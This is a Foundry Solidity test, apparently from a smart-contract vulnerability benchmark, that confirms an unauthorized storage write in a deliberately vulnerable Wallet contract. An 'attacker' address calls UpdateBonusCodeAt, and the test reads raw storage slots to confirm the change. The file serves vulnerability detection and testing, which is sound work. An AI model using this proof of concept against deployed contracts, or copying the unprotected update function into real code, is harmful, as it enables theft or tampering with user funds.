// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import "../src/arbitrary_location_write_simple.sol";

contract WalletTest is Test {
    Wallet public wallet;
    address public owner = makeAddr("owner");
    address public attacker = makeAddr("attacker");
    
    function setUp() public {
        vm.startPrank(owner);
        wallet = new Wallet();
        wallet.PushBonusCode(100); // Initialize with one code
        vm.stopPrank();
    }

    function test_unauthorized_code_update() public {
        uint256 arrayLengthSlot = 0;
        bytes32 elementSlot = keccak256(abi.encode(arrayLengthSlot));

        console2.log("--- BEFORE-Trigger State ---");
        bytes32 length = vm.load(address(wallet), bytes32(arrayLengthSlot));
        uint256 arrayLengthBefore = uint256(length);
        console2.log("Array length:", arrayLengthBefore);
        bytes32 preVal = vm.load(address(wallet), elementSlot);
        uint256 preBonusCode = uint256(preVal);
        console2.log("Bonus code at index0:", preBonusCode);

        console2.log("--- Trigger UpdateBonusCodeAt ---");
        vm.prank(attacker);
        wallet.UpdateBonusCodeAt(0, 999);

        console2.log("--- AFTER-Trigger State ---");
        bytes32 postVal = vm.load(address(wallet), elementSlot);
        uint256 postBonusCode = uint256(postVal);
        console2.log("Updated bonus code:", postBonusCode);
        bytes32 lengthAfter = vm.load(address(wallet), bytes32(arrayLengthSlot));
        uint256 arrayLengthAfter = uint256(lengthAfter);
        console2.log("Array length after:", arrayLengthAfter);

        if (postBonusCode == 999 && arrayLengthAfter == 1) {
            console2.log("Vulnerability Exists: Unauthorized storage modification confirmed");
        } else {
            console2.log("Vulnerability not Exist: State change unsuccessful");
        }
    }
}